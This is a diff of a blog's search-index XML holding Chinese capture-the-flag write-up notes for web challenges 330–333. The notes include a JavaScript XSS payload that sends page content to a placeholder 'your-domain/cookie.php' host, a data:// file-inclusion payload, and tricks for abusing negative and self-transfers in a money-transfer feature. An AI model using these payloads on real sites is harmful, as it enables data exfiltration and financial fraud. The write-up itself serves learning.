@@ -3114,7 +3114,7 @@ payload：<code>?2333=data://text/plain,todat is a happy day&amp;file=ZmpdYSZmXG
 <h1 id="web330-331"><a href="#web330-331" class="headerlink" title="web330 | 331"></a>web330 | 331</h1><p>读源码读了个寂寞，<code>admin************</code>，看看师傅的wp是改密码。。。我。。。直接读页面全部源码不就好了嘿嘿嘿</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">&quot;http://your-domain/cookie.php?cookie=&quot;</span>+<span class="built_in">document</span>.querySelector(<span class="string">&#x27;#top &gt; div.layui-container&#x27;</span>).tex    tContent;</span><br><span class="line"><span class="built_in">document</span>.body.append(img);</span><br></pre></td></tr></table></figure>
 
-<h1 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h1><p>注册两个账号，给另一个转-9999999999999999，会增加自己账户的钱</p>
+<h1 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h1><p>一开始想的给自己转钱，结果不对，第二天才是这样玩哈哈哈。<br>注册两个账号，给另一个转-9999999999999999，会增加自己账户的钱</p>
 <h1 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h1><p>自己给自己转账，，，妙~，bp直接爆破转</p>
 ]]></content>
       <categories>
